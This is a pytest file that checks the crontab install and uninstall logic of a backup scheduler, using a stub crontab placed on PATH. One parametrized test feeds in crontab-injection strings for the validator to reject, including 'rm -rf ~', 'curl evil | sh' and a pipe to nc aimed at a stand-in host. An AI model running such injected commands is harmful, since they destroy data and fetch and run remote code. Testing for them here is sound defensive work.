"""Cron entry install/uninstall — use a fake ``crontab`` via PATH.

We don't touch the real user crontab. A tiny shell script stub records
stdin/stderr into files under tmp_path and mimics ``crontab -l``.
"""

from __future__ import annotations

import os
import stat
from pathlib import Path

import pytest

from claude_backup_cron import scheduler
from claude_backup_cron.errors import SchedulerError

# cron is a POSIX feature. Windows has Task Scheduler, which is a
# different shape entirely and not something this tool targets in
# v0.1.0, so skip the whole module on Windows rather than stub a
# Task-Scheduler equivalent that wouldn't exercise real code paths.
pytestmark = pytest.mark.skipif(
    os.name == "nt",
    reason="cron is POSIX-only; Windows uses Task Scheduler (out of scope).",
)


def _install_stub(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    """Put a fake ``crontab`` binary on PATH that stores state in tmp_path."""
    state = tmp_path / "state"
    state.mkdir()
    stub_dir = tmp_path / "bin"
    stub_dir.mkdir()
    stub = stub_dir / "crontab"
    stub.write_text(
        "#!/bin/sh\n"
        f'STATE="{state}/crontab.txt"\n'
        'if [ "$1" = "-l" ]; then\n'
        '  if [ -f "$STATE" ]; then cat "$STATE"; else echo "no crontab for user" 1>&2; exit 1; fi\n'
        'elif [ "$1" = "-" ]; then\n'
        '  cat > "$STATE"\n'
        "else\n"
        '  echo "stub: unsupported arg $1" 1>&2; exit 2\n'
        "fi\n",
        encoding="utf-8",
    )
    stub.chmod(stub.stat().st_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)
    monkeypatch.setenv("PATH", f"{stub_dir}{os.pathsep}{os.environ['PATH']}")
    return state / "crontab.txt"


def test_read_empty_when_no_crontab(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    _install_stub(tmp_path, monkeypatch)
    assert scheduler.read_current() == ""


def test_install_writes_block(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    state_file = _install_stub(tmp_path, monkeypatch)
    # Fake binary path — install refuses if claude-backup-cron is not on PATH.
    monkeypatch.setenv(
        "PATH", monkeypatch.undo.__self__.getenv("PATH", "") if False else os.environ["PATH"]
    )  # no-op
    block = scheduler.install("0 3 * * *", binary="/usr/local/bin/claude-backup-cron")
    assert "claude-backup-cron managed entry" in block
    written = state_file.read_text(encoding="utf-8")
    assert "# claude-backup-cron managed entry" in written
    assert "0 3 * * *" in written


def test_install_replaces_prior_block(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    state_file = _install_stub(tmp_path, monkeypatch)
    # Seed a prior managed block + an unrelated user entry.
    state_file.write_text(
        "MAILTO=me@example.invalid\n"
        "# claude-backup-cron managed entry\n"
        "0 2 * * * old-command\n"
        "0 0 * * * user-custom-job\n",
        encoding="utf-8",
    )
    scheduler.install("30 4 * * *", binary="/opt/claude-backup-cron")
    written = state_file.read_text(encoding="utf-8")
    assert "old-command" not in written
    assert "30 4 * * *" in written
    assert "user-custom-job" in written
    assert "MAILTO=me@example.invalid" in written


def test_uninstall_removes_block(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    state_file = _install_stub(tmp_path, monkeypatch)
    state_file.write_text(
        "# claude-backup-cron managed entry\n0 2 * * * foo\n0 0 * * * user-job\n",
        encoding="utf-8",
    )
    removed = scheduler.uninstall()
    assert removed is True
    written = state_file.read_text(encoding="utf-8")
    assert "claude-backup-cron" not in written
    assert "user-job" in written


def test_uninstall_when_nothing_to_do(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    state_file = _install_stub(tmp_path, monkeypatch)
    state_file.write_text("0 0 * * * user-job\n", encoding="utf-8")
    assert scheduler.uninstall() is False


def test_install_rejects_empty_schedule(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    _install_stub(tmp_path, monkeypatch)
    with pytest.raises(SchedulerError, match="schedule"):
        scheduler.install("   ", binary="/usr/local/bin/claude-backup-cron")


@pytest.mark.parametrize(
    "bad_schedule",
    [
        # Classic crontab-injection shapes: anything after the cron fields
        # ends up in the command slot on most cron variants.
        "* * * * *; rm -rf ~",
        "0 3 * * * && curl evil | sh",
        "0 3 * * * | nc evil 9999",
        "0 3 * * * `id`",
        "0 3 * * * $(id)",
        # Too many / too few fields.
        "0 3",
        "0 3 * * * * * *",
        # Unrelated text.
        "run every day",
    ],
)
def test_install_rejects_invalid_schedule(
    bad_schedule: str,
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Schedule string is written verbatim into the crontab; reject anything
    that isn't a pure 5/6-field expression or ``@alias``."""
    _install_stub(tmp_path, monkeypatch)
    with pytest.raises(SchedulerError, match="invalid schedule"):
        scheduler.install(bad_schedule, binary="/usr/local/bin/claude-backup-cron")


@pytest.mark.parametrize(
    "good_schedule",
    [
        "0 3 * * *",
        "*/15 * * * *",
        "@daily",
        "@hourly",
        "@reboot",
        "0 0 1,15 * *",
        "0-30/5 * * * *",
    ],
)
def test_install_accepts_valid_schedule(
    good_schedule: str,
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _install_stub(tmp_path, monkeypatch)
    block = scheduler.install(good_schedule, binary="/usr/local/bin/claude-backup-cron")
    assert good_schedule in block


def test_no_crontab_on_path(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    empty = tmp_path / "empty"
    empty.mkdir()
    monkeypatch.setenv("PATH", str(empty))
    with pytest.raises(SchedulerError):
        scheduler.read_current()
